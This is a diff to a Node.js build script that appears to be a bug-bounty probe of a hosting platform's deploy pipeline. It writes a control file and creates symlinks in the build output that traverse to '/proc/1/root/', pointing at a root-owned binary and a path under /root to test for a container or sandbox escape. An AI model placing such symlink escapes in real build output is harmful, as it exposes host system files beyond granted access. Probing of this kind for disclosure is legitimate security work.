@@ -1,11 +1,11 @@
 import fs from "node:fs";
 import path from "node:path";
 
-const marker = "HOSTINGER_NODE_RELATIVE_BUILD_SYMLINK_GATE:r215";
+const marker = "HOSTINGER_NODE_HIDEPID_SYMLINK_GATE:r216";
 const output = path.resolve("dist");
 fs.rmSync(output, { recursive: true, force: true });
 fs.mkdirSync(output, { recursive: true });
-fs.writeFileSync(path.join(output, "control.txt"), `${marker}:8ef6c531fd1d45aa\n`, { mode: 0o600 });
+fs.writeFileSync(path.join(output, "control.txt"), `${marker}:a13e769021044237\n`, { mode: 0o600 });
 
 function createLink(name, target) {
   try {
@@ -17,8 +17,8 @@ function createLink(name, target) {
 }
 
 const safeLink = createLink("owned-link", "control.txt");
-const rootLink = createLink("root-owned-probe", "../../../../../../../../usr/sbin/proxyexec");
-const missingLink = createLink("missing-probe", "../../../../../../../../root/hostinger-h1-nonexistent-r215");
+const rootLink = createLink("root-owned-probe", "../../../../../../../../proc/1/root/usr/sbin/proxyexec");
+const missingLink = createLink("missing-probe", "../../../../../../../../proc/1/root/root/hostinger-h1-nonexistent-r216");
 
 let directRead;
 try {
